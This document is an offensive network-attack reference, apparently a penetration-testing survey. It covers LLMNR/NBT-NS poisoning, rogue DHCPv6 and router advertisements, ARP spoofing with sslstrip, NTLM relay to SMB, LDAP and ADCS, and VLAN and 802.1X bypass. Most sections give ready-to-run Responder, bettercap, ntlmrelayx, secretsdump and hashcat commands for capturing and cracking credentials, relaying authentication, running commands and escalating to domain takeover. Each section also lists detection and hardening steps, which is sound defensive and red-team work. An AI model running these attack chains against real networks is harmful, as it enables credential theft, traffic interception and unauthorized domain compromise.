# 13 — Network and Protocol Attacks (L2/L3 Layer)

L2/L3 attack/analysis layer: name-resolution poisoning, DHCP/RA takeover, ARP MITM, NTLM relay, 802.1X/VLAN, IPv6, capture analysis. Covers bettercap, Responder (lgandx), impacket ntlmrelayx/smbclient/secretsdump, nmap NSE L2 discovery, tcpdump/tshark/zeek.

Sources (gh api): bettercap/bettercap 20,241★ pushed 2026-11-03; lgandx/Responder 6,659★ 2026-06-10; fortra/impacket 16,233★ 2026-11-04; nmap/nmap 13,942★ 2026-11-05. All flags from current source. UNVERIFIED where marked.

---

## 1. Name-resolution poisoning — LLMNR / NBT-NS / mDNS
### What the protocol leaks
Windows falls back to LLMNR (UDP/5355→224.0.0.252), NBT-NS (137→255.255.255.255), mDNS (5353→224.0.0.251) when DNS fails. All unauthenticated: first answer wins; client then authenticates to the attacker (NTLM/Basic/Kerberos). mDNS also leaks hostnames/TXT passively.
### Tool + command
Responder `create_parser()` (Responder.py:43, parser :89). `-I/--interface` required (:105). Poisoning: `-A/--analyze` passive (:121), `-e/--externalip` (:127), `-6/--externalip6` (:134), `--rdnss` (:141), `--dnssl` (:147), `-t/--ttl` (:154), `-N/--AnswerName` (:161). DHCP: `-d` WPAD (:177), `-D` DNS (:183), `--dhcpv6` (:189, "May disrupt network"). WPAD: `-w` (:204), `-F/--ForceWpadAuth` (:210), `-P/--ProxyAuth` (:216, "Highly effective", exclusive `-w`), `-u/--upstream-proxy` (:222). Auth: `-b/--basic` (:238), `--lm` (:244), `--disable-ess` (:250), `-E/--ErrorCode` (:256, WebDAV loops). `-v/--verbose` (:271), `-Q/--quiet` (:277); `-i/--ip` (:292, macOS mandatory). Refuses non-root. Responder.conf `[Responder Core]`: `MDNS/LLMNR/NBTNS = On`; servers `SQL/SMB/QUIC/RDP/Kerberos/FTP/POP/SMTP/IMAP/HTTP/HTTPS/DNS/LDAP/DCERPC/WINRM/SNMP/MQTT/MYSQL` `On`; `Challenge = Random`; `Responder.db`, session logs; scoping `RespondTo/RespondToName/DontRespondTo/DontRespondToName` (default `ISATAP`)/`DontRespondToTLD` (default `_dosvc`); `AutoIgnoreAfterSuccess = Off`, `CaptureMultiple{Credentials,HashFromSameHost} = On`. `[Kerberos]` `KerberosMode = CAPTURE` with comment-documented `FORCE_NTLM` alternative → KDC_ERR_ETYPE_NOSUPP → NTLMv2 fallback. `[HTTP Server]` `WPADScript`/`HTMLToInject`/`ExeFilename`/`HtmlFilename = files/AccessDenied.html`; `[HTTPS Server]` `certs/responder.crt|key`.
```
python3 Responder.py -I eth0 -v            # poison/capture
python3 Responder.py -I eth0 -Av           # analyze — passive, verify first
python3 Responder.py -I eth0 -wFv          # WPAD + forced auth
python3 Responder.py -I eth0 -Pv           # proxy auth
python3 Responder.py -I eth0 --dhcpv6 -vP  # DHCPv6 + proxy auth
python3 Responder.py -I eth0 -Pvd          # DHCP→WPAD→proxy (epilog Responder.py:57–85)
python3 Responder.py -I eth0 -e 10.0.0.100 # poison to arbitrary IP
```
tools/: `BrowserListener.py`, `DNSUpdate.py` ([MS-DNSP] DNS_RECORD), `FindSQLSrv.py`, `Icmp-Redirect.py`, `MultiRelay.py`+`MultiRelay/`, `RunFinger.py`+`RunFingerPackets.py`+`SMBFinger`, `odict.py`. MultiRelay.py:84–89: `-t`, `-p`, `-u/--UserToRelay` (or ALL), `-c/--command`, `-d/--dump`. RunFinger.py:33–35: `-i/--ip`, `-f/--filename`, `-t/--timeout` (SMB prober — use before poisoning).
Nmap: `llmnr-resolve.nse` → 224.0.0.252:5355 (`--script-args llmnr-resolve.hostname=/, privileged); `broadcast-netbios-master-browser.nse` queries `__MSBROWSE__` to 255.255.255.255 (`ip/server/domain`); `broadcast-dns-service-discovery.nse` queries `_services._dns-sd._udp.local`. Bettercap has no LLMNR module; its L2 is `arp.spoof`+`dns.spoof`/`dhcp6.spoof` (sections 2–3).
### What to do with the capture
Net-NTLMv1/v2 (Basic cleartext with `-b`) → Responder.db + session log. `--disable-ess` → NTLMv1 (`-m 5500`-class); `--lm` LM-era. Hashcat modes per conf comments: CAPTURE → `-m 7500` (AS-REP); FORCE_NTLM → `-m 5600` (NetNTLMv2). Live relay via MultiRelay/ntlmrelayx (section 4).
### Detection
LLMNR/NBNS answers from non-DC/multiple hosts; duplicate-answer races; NTLM auth to newly-seen listeners on workstation subnets; Zeek `dns.log`/`ssl.log` mismatches; workstation firewall inbound 137/445/5355/5353.

---

## 2. DHCPv4/v6 + Router Advertisements
### What the protocol leaks
DHCP leaks subnet, gateway, DNS (opt 6), domain search (15/119), PAC/WPAD (opt 252). Rogue DHCP/RA controls DNS, gateway, PAC, and over IPv6 RDNSS/DNSSL + SLAAC. IPv6 is commonly unmonitored where IPv4 is filtered. Responder `-d` injects WPAD, `-D` DNS; `--rdnss/--dnssl` poison via RA (Responder.py:141/147). Responder.conf `[DHCPv6 Server]`: `DHCPv6_Domain` (empty=poison all, NOT RECOMMENDED), `SendRA = Off` default (RA "more detectable"), `BindToIPv6` auto link-local.
### Tool + command
```
python3 Responder.py -I eth0 -d -v      # DHCPv4 + WPAD injection
python3 Responder.py -I eth0 -D -v      # DHCPv4 + DNS injection
python3 Responder.py -I eth0 --dhcpv6 -v # DHCPv6 (add -P for proxy auth)
python3 Responder.py -I eth0 -Pvd       # DHCP→WPAD→proxy (epilog)
```
Bettercap `dhcp6.spoof` (dhcp6_spoof.go:41), Requires `net.recon` (:46). Param `dhcp6.spoof.domains` (:48, default `microsoft.com, google.com, facebook.com, apple.com, twitter.com`), handlers `dhcp6.spoof on/off` (:53/:59), read via `ListParam("dhcp6.spoof.domains")` at :96 → `DHCP6EncodeList`. Description(): "Replies to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server (https://github.com/fox-it/mitm6/)". Configure opens `network.Capture`, BPF `ip6 and udp`, DUID-LLT from iface MAC. Flow: `net.recon on` → `set dhcp6.spoof.domains microsoft.com,google.com` → `dhcp6.spoof on`.
Nmap: `broadcast-dhcp-discover.nse` — DHCP to 255.255.255.255, static MAC `DE:AD:CO:DE:CA:FE` (prevents pool exhaustion), offers via pcap, 10s, privileged; prints offered IP, server ID, lease, mask, router, DNS, domain. `broadcast-dhcp6-discover.nse` — DHCPv6 Solicit to multicast, privileged UDP/546; prints Advertise (server ID, address, DNS, domain search, NTP). `dhcp-discover.nse` — DHCPINFORM to UDP/67 (no allocation); args `dhcp-discover.dhcptype` (INFORM/OFFER/REQUEST/DECLINE/ACK/NAK/RELEASE) + `dhcp-discover.mac` (native/random/specific).
### What to do with the capture
Rogue DNS/WPAD/RA converts to section 1/10 capture (rogue DNS, PAC, RDNSS). `DHCPv6_Domain`/`dhcp6.spoof.domains` scoping is the line between surgical and network-disrupting.
### Detection
Multiple DHCPOFFERs per DISCOVER; offers from non-authorized servers (audit via `broadcast-dhcp-discover`); DHCPv6 Advertise from unknown DUIDs; RA with RDNSS/DNSSL from non-router MACs; starvation via `dhcp-discover.mac random`; Zeek `dhcp.log` server-ids; DHCP Event 1022/1024 clusters. RA Guard/DHCP snooping blocks both at L2 — wins despite them mean the poison source is inside the trust boundary.

---

## 3. ARP / MITM + TLS-stripping surface (bettercap)
### What the protocol leaks
ARP is unauthenticated: any host can claim any IP. Spoof (no DAI/ARP ACLs is the precondition) puts victim↔gateway traffic through the attacker: cleartext (HTTP/FTP/Basic/cookies/SMBv1) exposed, rewriting (DNS/HTTP/sslstrip) enabled. bettercap layers: `arp.spoof` → `dns.spoof` → `http.proxy`+`sslstrip` → `net.sniff` parsers (`modules/net_sniff/` 28 files: ftp/http/krb5/ntlm/mdns/sni/upnp/teamviewer). `modules/`: `arp_spoof/arp_spoof.go`, `dns_spoof/dns_spoof.go` + `dns_spoof_hosts.go`, `dhcp6_spoof/dhcp6_spoof.go`, `dns_proxy/*`, `net_sniff/*`, `http_proxy/*` (13 files incl. `http_proxy_base_sslstriper.go`, cookietracker, hosttracker, script, cert cache), `wifi/*` (wifi_recon.go, wifi_deauth.go, wifi_bruteforce_*, wifi_assoc, wifi_fake_auth), `ble/*` (ble_recon.go, ble_show*, ble_recon_events.go).
### Tool + command
`arp.spoof` (arp_spoof.go:37), Requires `net.recon` (:52): `arp.spoof.targets` (:54, subnet default, nmap ranges), `arp.spoof.whitelist` (:56), `arp.spoof.internal` (:58, false), `arp.spoof.fullduplex` (:62, false; help: router protections "will make the attack fail"), `arp.spoof.skip_restore` (:66, false), `arp.spoof.spoofed` (:80, default gateway ParamGatewayAddress), `arp.spoof.forwarding` (:85, true), `arp.spoof.interval` (:89, 1000 ms). Handlers `arp.spoof on` (:93), `arp.ban on` (:99), `arp.spoof off` (:106), `arp.ban off` (:112).
```
set arp.spoof.targets 192.168.1.20
set arp.spoof.fullduplex true
arp.spoof on
```
`dns.spoof` (dns_spoof.go:34), Requires `net.recon` (:42): `dns.spoof.hosts` (:44), `dns.spoof.domains` (:49), `dns.spoof.address` (:54, iface IP ParamIfaceAddress, IPv4 validator), `dns.spoof.all` (:59, false), `dns.spoof.ttl` (:63, `1024`). `dns.spoof on/off` (:68/:74).
`net.sniff` (net_sniff.go:28): `net.sniff.verbose` (:32), `net.sniff.local` (:36), `net.sniff.filter` (:40, BPF), `net.sniff.regexp` (:45), `net.sniff.output` (:50), `net.sniff.source` (:55), `net.sniff.interface` (:60). `net.sniff on/off` (:77/:83); `net.fuzz on/off` (:89/:95), `net.fuzz.layers/rate/ratio/silent` (:101–:114). Auto-starts `net.recon` when no source (:180–:182).
`http.proxy` (http_proxy.go:16): `http.port` (:20), `http.proxy.address` (:24), `http.proxy.port` (:29), `http.proxy.redirect` (:33), `http.proxy.script` (:37), `http.proxy.injectjs` (:42), `http.proxy.blacklist` (:47), `http.proxy.whitelist` (:50), `http.proxy.sslstrip` (:53). `http.proxy on/off` (:57/:63).
`wifi` (wifi/wifi.go:76): `wifi.interface` (:112), `wifi.recon on/off` (:117/:123), `wifi.bruteforce.target/wordlist/workers/wide/stop_at_first/timeout` (:129–:151), `wifi.clear` (:167), `wifi.recon MAC` (:174), `wifi.recon clear` (:188), `wifi.rssi.min` (:252), deauth params (:324+); recon itself is `wifi_recon.go`. `ble.recon` (ble/ble_recon.go:38): `ble.recon on/off`, `ble.clear`, `ble.show`, `ble.enum MAC`, `ble.write MAC UUID HEX_DATA`; params `ble.device`/`ble.timeout` (5)/`ble.ttl` (30) via `mod.IntParam`. BLE feeds IoT/MAC inventory only.
### What to do with the capture
`net.sniff` parsers: FTP (Basic creds), HTTP, Kerberos, NTLM (→ section 4), mDNS, SNI, UPnP. `http.proxy` sslstrip: cookie/session replay, JS injection. Canonical stack: `arp.spoof` → `dns.spoof` (point at Responder) → capture → relay/crack. `dns.spoof.address` defaults to your iface IP.
### Detection
ARP churn/gratuitous ARR floods at interval cadence; two hosts claiming the gateway; MAC flapping; ARP replies with broadcast destination from non-gateway MACs; sslstrip artifacts (forced `http://` downgrade, HSTS gaps, cert warnings). DAI/ARP ACLs + arpwatch are the counters.

---

## 4. NTLM relay — SMB/HTTP/LDAP/LDAPS/MSSQL, signing, RBCD, ADCS ESC8
### What the protocol leaks
SMB signing required → relay fails (ntlmrelayx.py:25: "to stop this attack is to enforce on the server SPN checks and or signing"); LDAP signing required → relay fails; **LDAPS/CTB** — no explicit LDAPS-relay arg in the parser, outcome environment-dependent — UNVERIFIED, lab-test; **MSSQL** — `-q/--query` (:394) and `--mssql-db` (:361) are post-relay execution, not pure relay. Capture (Responder) gives an offline hash; relay (ntlmrelayx/MultiRelay) gives a live session. `--reauth-bypass` (ntlmrelayx.py:372–:379) exists to defeat *enforced signing*.
### Tool + command
impacket `ntlmrelayx.py` (parser from ~:280). Relay: `-t/--target` (:293), `-tf`, `-w`, `-i/--interactive` (:301). Servers: `--no-smb-server` (:310), `--no-http-server` (:311), `--no-wcf-server` (:312, ADWS :9389), `--no-raw-server` (:313), `--no-rpc-server` (:314), `--no-winrm-server` (:315), `--no-mssql-server` (:316), `--no-rdp-server` (:317). Listen ports: `--smb-port` 445 (:319), `--http-port` 80 comma/range (:320), `--wcf-port` 9389 (:321), `--raw-port` 6666 (:322), `--rpc-port` 135 (:323), `--mssql-port` 1433 (:324), `--rdp-port` 3389 (:325). `--no-multirelay` (:327), `--keep-relaying` (:328), `-ra/--random` (:329). Loot: `-r` HTTP→file:// (:330), `-l/--lootdir` (:331, `.`), `-of/--output-file` (:334), `-dh/--dump-hashes` (:336). `-smb2support` (:342), `-ntlmchallenge` (:343). SOCKS: `-socks` (:345), `-socks-address` 127.0.0.1 (:347), `-socks-port` 1080 (:348), `-http-api-port` 9090 (:349). WPAD: `-wh/--wpad-host` (:350), `-wa/--wpad-auth-num` 1 (:352, MS16-077), `-6/--ipv6` (:354). CVE bypasses: `--remove-mic` CVE-2019-1040 (:355), `--remove-sign-seal` CVE-2025-33073 (:356). Post-relay SMB: `-e` exec (:366), `--dump-lsa` (:368), `--enum-local-admins` (:370), `--rpc-attack TSCH|ICPR` (:371), `--reauth-bypass` (:372), `--reauth-bypass-hashes` (:379). RPC: `-rpc-mode` (:384), `-rpc-use-smb` (:385), `-auth-smb` (:386), `-hashes-smb` (:388), `-rpc-smb-port` (:389), `-icpr-ca-name` (:390). HTTP client: `-machine-account` (:399), `-machine-hashes` (:400), `-domain` (:404), `--remove-target` (:406), `--https` (:407), `--certfile` (:409), `--keyfile` (:410). LDAP (RBCD): `--no-dump` (:416), `--no-da` (:417), `--no-acl` (:418), `--no-validate-privs` (:419), `--escalate-user` (:420), `--delegate-access` (:421, RBCD trigger), `--delegate-target` (:422, sAMAccountName or full DN — "instead of the relayed computer itself"), `--sid` (:423), `--dump-laps` (:424), `--dump-gmsa` (:425), `--dump-adcs` (:426), `--dump-info-attr` (:427), `--dump-pre2k` (:428), `--add-dns-record` (:429). Common: `--add-computer` (:433). IMAP `-k/-m/-a/-im` (:437–:443). ADCS: `--adcs` (:448), `--adcs-ces` (:449, errors :503/:505 require `-t`/`-tf`), `--template` (:450), `--altname` (:451, ESC1/ESC6 SAN), `--altsid` (:452), `--enum-templates` (:456). Shadow creds `--shadow-credentials/--shadow-target/--pfx-password/--export-type/--cert-outfile-path/--shadow-replace/--backup-path` (:460–:470). SCCM `--sccm-policies/--sccm-dp` (:475/:480).
```
python3 ntlmrelayx.py -t smb://192.168.1.10 -smb2support -c "whoami"
python3 ntlmrelayx.py -t ldap://192.168.1.1:389 --delegate-access --escalate-user svc_target
python3 ntlmrelayx.py -t http://CA:80 -i --lootdir ./loot
```
LDAP options wired via `setLDAPOptions(...)` (ntlmrelayx.py:199), passing `no_dump/no_da/no_acl/escalate_user/add_computer/delegate_access/dump_laps/dump_gmsa/dump_adcs/sid/add_dns_record/dump_info_attr/dump_pre2k/delegatetarget`.
`smbclient.py` — post-relay shell: `target` (:35), `-inputfile` (:36), `-outputfile` (:37), `-debug` (:38), `-ts` (:39); `-hashes` (:43), `-no-pass` (:44), `-k` (:45 ccache), `-aesKey` (:49); `-dfs-follow` (:54); `-dc-ip` (:60), `-target-ip` (:63), `-port` 139/445 default 445 (:66). `secretsdump.py` — DCSync-grade dump: `target` (:413), `-system/-bootkey/-security/-sam/-ntds/-resumefile` (:417–:423), `-skip-sam/-skip-security` (:426–:427), `-outputfile` (:428), `-use-vss` (:430), `-just-dc-user` (:448), `-just-dc` (:454), `-just-dc-ntlm` (:456), `-trust-keys` (:458), `-just-trust-keys` (:461), `-hashes/-no-pass/-k/-aesKey/-keytab` (:473–:480), `-dc-ip` (:483).
MultiRelay (`tools/MultiRelay.py:84–89`): `python3 MultiRelay.py -t <SMB target> -u ALL -c "whoami"`; legacy pure-SMB chain — ntlmrelayx supersedes it for RBCD/ADCS.
### What to do with the capture
Relayed SMB session as victim (exec via secrets/service pipe; `--dump-laps`/`--dump-gmsa` loot). Relayed LDAP bind → RBCD: `--delegate-access` writes `msDS-AllowedToActOnBehalfOfOtherIdentity` on the relayed computer (or `--delegate-target DN`) → S4U2Self/S4U2Proxy → DCSync. `--add-computer` creates the companion computer account. HTTP→ADCS: ESC8 via `--adcs`; ESC1/ESC6 via `--template/--altname/--altsid`; CES/WSTEP via `--adcs-ces`. SCCM via `--sccm-*`.
### Detection
NTLM downgrade bursts; auth workstation→server where the client never resolved the server via DNS; relayed-MIC SMB sessions + abnormal timing; LDAP binds from workstations outside service patterns; SAM creation spikes (Event 4741); delegation writes (`msDS-AllowedToActOnBehalfOfOtherIdentity` — Event 5136 class, confirm per version); cert issuance to unexpected principals (CA log); `-socks` egress anomaly. Harden: `RequireSecuritySignature=1`, `RequireLdapSigning=1`, LDAPS+EPA on CA Web, disable NTLMv1.

---

## 5. 802.1X / NAC bypass options
### What the protocol leaks
802.1X gates the switch port behind EAP auth. Bypasses exploit the policy-vs-deployment gap: (a) MAB fallback — spoof a known low-trust ("dumb device") MAC; (b) single-host mode — first authenticated device owns the port, spoofing after auth is free; (c) EAP downgrade — RADIUS accepting EAP-MD5/PEAP-MSCHAPv2 allows downgrade vs EAP-TLS; (d) VoIP phone VLAN — phone-authenticated VLAN carries daisy-chained devices; (e) guest/registration VLAN adjacent to data; (f) fail-open on NAC-agent loss.
No repo here implements an 802.1X client (no EAP flags in bettercap/impacket/Responder). Toolkit: `wpa_supplicant` (EAP-TLS/PEAP), plus bettercap `wifi`/`ble` recon (wifi/wifi.go:117, ble/ble_recon.go:38):
```
set wifi.interface wlan0
wifi.recon on
wifi.show
```
### What to do with the capture
MAB-spoofed MAC + printer/IoT OUI inventory (`wifi.show` + DHCP leases + CDP/LLDP) gives admissible identities. PEAP-MSCHAPv2 harvests crack offline. EAP-TLS without private key cannot be harvested — cert-theft only.
### Detection
New MAB-OUI MACs on 802.1X ports, EAP downgrade events, auth-failure bursts, sticky-MAC churn, RADIUS accounting from unknown NAS-IDs, voice-VLAN data ether-types. Fix: scope/disable MAB per-port with OUI whitelists, multi-host mode off, 802.1X fail-closed, guest VLAN with no data-VLAN adjacency. Switch/RADIUS CLI here is UNVERIFIED in this survey.

---

## 6. VLAN hopping — DTP, double tagging, VoIP phone path
### What the protocol leaks
(1) **DTP** — ports at `dynamic desirable/auto` negotiate trunk; attacker enumerates VLANs. (2) **Double tagging** — stacked 802.1Q frames: outer tag stripped at access port, inner survives. (3) **VoIP phone path** — phone's built-in switch grants the voice VLAN to daisy-chained devices. (4) **Unpruned trunk/native-VLAN data** — hop into trunk-reachable VLANs without DTP.
No module in the surveyed repos implements VLAN hopping (no flag exists); switch-config audit + raw-frame crafting (Scapy/link-layer, UNVERIFIED per vendor). Yersinia-class tooling is UNVERIFIED/not in this survey — no invented flag. Procedure (vendor-agnostic, UNVERIFIED): check port mode `show interface <port> switchport` for `dynamic auto/desirable` + native-VLAN tagging; DTP probe with Scapy frames `dst=01:00:0c:cc:cc:cc, Ether(dst, Dot1Q(vlan=…))`, then `show interfaces trunk`; double-tag toward target VLAN broadcast domain, listen for LLDP/CDP; confirm voice VLAN + data-frame inheritance on the phone's second port. LLDP/CDP capture `tcpdump -f -l -e -n -i eth0 '(ether dst 01:00:0c:cc:cc:cc)'` shows native/phone VLAN IDs.
### What to do with the capture
Hopped VLAN lands you on the victim broadcast domain: re-run nmap broadcast discovery (`broadcast-dhcp-discover`, `broadcast-dhcp6-discover`, ARP sweep), then the standard chains on the new segment.
### Detection
Unexpected trunk negotiation on access ports (link-flap + DTP events), double-tagged frames in switch logs, voice VLAN carrying non-voice ether-types, port-security violations on hopped VLANs, tagged frames on untagged ports. Fix: `switchport mode access` + `switchport nonegotiate` on user ports, prune unused VLANs, native VLAN = unused non-data VLAN, port-security + 802.1X (section 5).

---

## 7. IPv6 attack surface — SLAAC, DHCPv6, DNS takeover (mitm6 logic)
### What the protocol leaks
IPv6 frequently lacks firewall parity/RA Guard/DHCPv6 monitoring. Three primitives: (1) **Rogue RA** — default-router + RDNSS/DNSSL → SLAAC + IPv6 DNS; (2) **Rogue DHCPv6** — answer Solicit with your DNS/search/WPAD (Responder variant); (3) modern clients prefer IPv6 — winning DHCPv6 wins the DNS path even where IPv4 looks clean. bettercap `dhcp6.spoof` ports fox-it/mitm6: Description() (dhcp6_spoof.go): "Replies to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server (https://github.com/fox-it/mitm6/)". Opens `network.Capture`, BPF `ip6 and udp`, `DHCP6EncodeList`, DUID-LLT from iface MAC. One param only (`dhcp6.spoof.domains` :48) — no RA toggle (RA/RDNSS is the Responder `--rdnss/--dnssl` path, Responder.py:141/147).
### Tool + command
```
net.recon on
set dhcp6.spoof.domains microsoft.com,google.com
dhcp6.spoof on
set arp.spoof.targets 192.168.1.20
set arp.spoof.fullduplex true
arp.spoof on
```
```
python3 Responder.py -I eth0 --dhcpv6 -vP   # DHCPv6 + proxy auth (epilog)
python3 Responder.py -I eth0 --rdnss -v     # RDNSS via RA
python3 Responder.py -I eth0 --dnssl corp.local -v  # DNSSL search suffix
```
Nmap recon: `nmap -6 --script broadcast-dhcp6-discover` (scripts/broadcast-dhcp6-discover.nse: Solicit to multicast, privileged UDP/546).
### What to do with the capture
Rogue IPv6 DNS → capture (NetNTLMv2) or relay (`ntlmrelayx.py -6/--ipv6` :354, `-t ldap://DC:389` RBCD → Chain C). RDNSS/DNSSL wins persist for the SLAAC lifetime. Finding: IPv4 monitoring often does not cover the IPv6 DNS path.
### Detection
RA from non-router MACs; RDNSS/DNSSL in RA (tcpdump `ip6` RA filter; exact Zeek `icmp.log` field UNVERIFIED); DHCPv6 Advertise from unknown DUIDs; multiple DHCPv6 servers per Solicit; SLAAC churn; Windows IPHelper6 logs. Fix: RA Guard, DHCPv6 snooping/guard, disable unused IPv6, monitor FF02::1.

---

## 8. Capture analysis — tcpdump / tshark / zeek
### What the protocol leaks
Every capture here is plaintext or relayable: LLMNR/NBNS/mDNS queries (asker + intended hostname), DHCP (leases, PAC), ARP (topology), NTLM exchanges (NetNTLMv1/v2 blobs), Basic/LM (cleartext), LDAP/SMB signing state (relay feasibility). Promote fields into poison targets (frequent queried names), hashcat scope (Responder.db + `-l/--lootdir` loot), relay targets (`smb2-security-mode` signing-off hosts), detection evidence (rogue-responder MAC/IP).
### Tool + command
tcpdump:
```
tcpdump -i eth0 -nn -XX -w capture.pcap 'tcp port 445 or udp port 137 or udp port 5355 or udp port 5353'
tcpdump -r capture.pcap -A '((ip6 and udp) or ip6-icmp)' -c 50
tcpdump -r capture.pcap -X 'udp port 67 or (udp port 546)'
```
tshark (filter anchors — `llmnr/nbns/mdns/dhcp/dhcpv6/arp/ntlmssp/spnego/http.auth/ldap` — are reliable; exact field names must be grepped against local `tshark -G fields` and are UNVERIFIED per-field here):
```
tshark -r capture.pcap -Y 'ntlmssp or spnego or http.auth or ldap' \
  -T fields -e ntlmssp.auth.user -e ntlmssp.auth.host \
  -e ntlmssp.auth.challenge -e http.auth.user -e ldap.bind.auth > ntlm.txt
tshark -r capture.pcap -Y 'llmnr' -T fields -e llmnr.key.name -e ip.src \
  -e llmnr.response | sort | uniq -c | sort -nr
tshark -r capture.pcap -Y 'nbns and nbns.flags.response==0' \
  -T fields -e nbns.name -e ip.src | sort | uniq -c | sort -nr
tshark -r capture.pcap -Y 'mdns' -T fields -e ip.src -e dns.qry.name -e dns.txt | head -100
tshark -r capture.pcap -Y 'dhcp and dhcp.option.dhcp_server_id' \
  -T fields -e dhcp.option.dhcp_server_id -e dhcp.option.router -e dhcp.option.domain_name_server
tshark -r capture.pcap -Y 'dhcpv6 or icmpv6' -T fields \
  -e ipv6.src -e dhcpv6.opt_dns_stable_id -e dhcpv6.mgt.addr.dns \
  -e icmpv6.ra.router_lifetime -e icmpv6.ra.dns_flags
tshark -r capture.pcap -Y 'arp.opcode==2' -T fields -e arp.src.hw_mac -e arp.src.proto_ipv4 \
  | sort | uniq -c | sort -nr
```
Zeek (protocol logging — conventions UNVERIFIED in this survey):
```
zeek -r capture.pcap   # produces dns.log conn.log ssl.log x509.log
cat dns.log | zeek-cut id.orig_h query answers | sort | uniq
grep -E ":445|:137|:5355|:5353|:80|:389" conn.log | head   # NTLM bursts / WPAD
```
Hashcat (modes per Responder.conf `[Kerberos]` comments: CAPTURE `-m 7500`, FORCE_NTLM `-m 5600`):
```
hashcat -m 5600 responder.txt   # NetNTLMv2
hashcat -m 5500 responder.txt   # LM/NTLMv1 (downgrade)
hashcat -m 7500 kerberos.txt    # AS-REP from CAPTURE mode
```
### What to do with the capture
`uniq -c` patterns are the "who asks / who answers" views for offense prioritization and blue-team hunting. Promote: frequent queried names → poison targets; signing-off hosts → ntlmrelayx `-t`/`-tf`; usernames → later credential scope (where in scope); rogue-responder MAC/IP → incident report.
### Detection
The harness IS the detection surface: unexpected LLMNR/NBNS volume, DHCP offers from non-authorized servers, ARP claimant multiplicity, NTLM auth to hosts with no DNS record, HTTP-PAC WPAD fetches, Kerberos preauth failures at scale.

---

## 9. SMB signing audit and `nxc smb --gen-relay-list`
### What the protocol leaks
`smb2-security-mode.nse` (scripts/smb2-security-mode.nse: "Determines the message signing configuration in SMBv2 servers for all supported dialects" via SMB2_COM_NEGOTIATE security-mode; `safe, discovery, default`):
```
nmap -p 445 --script smb2-security-mode <target>
nmap -p 139 --script smb2-security-mode <target>
```
Output (script comments): `3.1.1: Message signing enabled but not required`.
For fleet relay-target generation, the documented NetExec workflow is `nxc smb <targets> --gen-relay-list`, emitting signing-off targets for ntlmrelayx `-t`/`-tf`. NetExec not vendored here and `nxc`/`netexec` not installed in the research env — the flag is UNVERIFIED locally; verify with `nxc smb --help` / upstream docs before automating.
### Tool + command
```
nmap -p 445,139 --script smb2-security-mode 192.168.1.0/24 -oX smbsec.xml
nxc smb 192.168.1.0/24 --gen-relay-list -o relay_targets.txt   # UNVERIFIED locally
python3 ntlmrelayx.py -tf relay_targets.txt -smb2support -c "whoami"
```
Impacket ships no signing-audit CLI; audit is nmap/NXC, relay is ntlmrelayx.
### What to do with the capture
`relay_targets.txt` is the direct input to ntlmrelayx `-t`/`-tf` (section 4). Order: signing-off servers first, DCs last (DC relay is the tripwire). `--keep-relaying` + `-w` watch mode retries recovered hosts.
### Detection
SMB negotiate storms across a subnet; `smb2-security-mode` default-category runs from unknown hosts; repeated probing of signing-off targets. Enforce `RequireSecuritySignature=1` on all servers (especially DCs); turn the relay-target list into a hardening ticket.

---

## 10. WPAD / proxy abuse
### What the protocol leaks
WPAD is unsigned auto-proxy discovery: DHCP option 252 / class ids / DNS `wpad` return a PAC URL telling the browser which proxy to use. Every stage is poisonable (rogue DHCP injects the PAC URL; rogue DNS answers `wpad`; rogue HTTP serves the PAC). `broadcast-wpad-discover.nse`: "Retrieves a list of proxy servers on a LAN using … both the DHCP and DNS methods … starts by querying DHCP"; args `broadcast-wpad-discover.domain`, `.nodns`, `.nodhcp`, `.getwpad`.
Responder (Responder.py:197+ WPAD group; conf `[HTTP Server]` `WPADScript`/`HTMLToInject`): `-w/--wpad` (:204), `-F/--ForceWpadAuth` (:210), `-P/--ProxyAuth` (:216, "Highly effective", exclusive `-w`), `-u/--upstream-proxy` (:222). Epilog: `python3 Responder.py -I eth0 -wFv`, `python3 Responder.py -I eth0 -Pv`, `python3 Responder.py -I eth0 -Pvd`. `WPADScript` injected "with your current IP address" (conf comment). ntlmrelayx side: `-wh/--wpad-host` (:350), `-wa/--wpad-auth-num` (:352, MS16-077).
### Tool + command
```
nmap --script broadcast-wpad-discover --script-args broadcast-wpad-discover.getwpad
nmap --script broadcast-wpad-discover  # no-arg, local-domain reverse
python3 Responder.py -I eth0 -wFv
python3 Responder.py -I eth0 -Pv
python3 Responder.py -I eth0 -Pvd        # DHCP inject + WPAD + proxy auth
python3 Responder.py -I eth0 -A -v        # passive confirm first
python3 ntlmrelayx.py -wh 10.0.0.100 -wa 3 -t smb://192.168.1.10 -smb2support
```
### What to do with the capture
Proxy auth yields NTLM via Proxy-Authorization, or cleartext Basic with `-b/--basic` (Responder.py:238). WPAD without auth yields traffic interception via PAC-controlled proxy. `-E/--ErrorCode` (STATUS_LOGON_FAILURE) drives WebDAV loops ("enables WebDAV auth capture"). Forced-auth WPAD is user-visible (a prompt) — plan that user impact.
### Detection
PAC fetches over HTTP to non-IT hosts; `wpad.dat` from unknown IPs; proxy-auth requests from browsers; DNS queries for `wpad` without configured auto-proxy; HTTP proxy engagement at boot with no user action. Harden: disable AutoProxy/WPAD from GPO, block DNS `wpad` at the resolver, strip DHCP option 252, drop or TLS-sign HTTP PACs.

---

## Relay target matrix

| Protocol | Port | SMB signing off? | LDAP signing off? | LDAPS/CTB bypass? | Result |
|---|---|---|---|---|---|
| SMB | 445 | Yes | — | — | Relayed session; exec / `--dump-laps` / `--dump-gmsa` loot |
| SMB | 139 | Yes | — | — | Same as 445 (legacy) |
| HTTP → ADCS Web (ESC8) | 80/443 | — | — | CA must accept NTLM to Web | Certificate for relayed principal (`--adcs`) |
| HTTP → SCCM MP | 80 | — | — | — | Policy / DP package dump (`--sccm-*`) |
| ICPR RPC (ESC8 variant) | 135 | per-pipe | — | — | Cert-request relay (`--rpc-attack ICPR`) |
| ADWS WCF | 9389 | — | — | — | ADWS service relay |
| LDAP | 389 | — | Yes | — | Relayed bind → RBCD (`--delegate-access`), `--escalate-user`, `--dump-laps/gmsa/adcs` |
| LDAP (DN bypass) | 389 | — | signing-bypass DN form | — | RBCD on arbitrary object via `--delegate-target DN` |
| LDAPS | 636 | — | — | Yes (CTB) — UNVERIFIED | UNVERIFIED until lab-tested; prefer LDAP 389 RBCD |
| MSSQL | 1433 | native SQL auth | — | — | Post-relay query exec (`-q`), not pure NTLM relay |
| Kerberos | 88 | — | — | — | Capture (AS-REP `-m 7500`) or FORCE_NTLM (`-m 5600`), not relay |
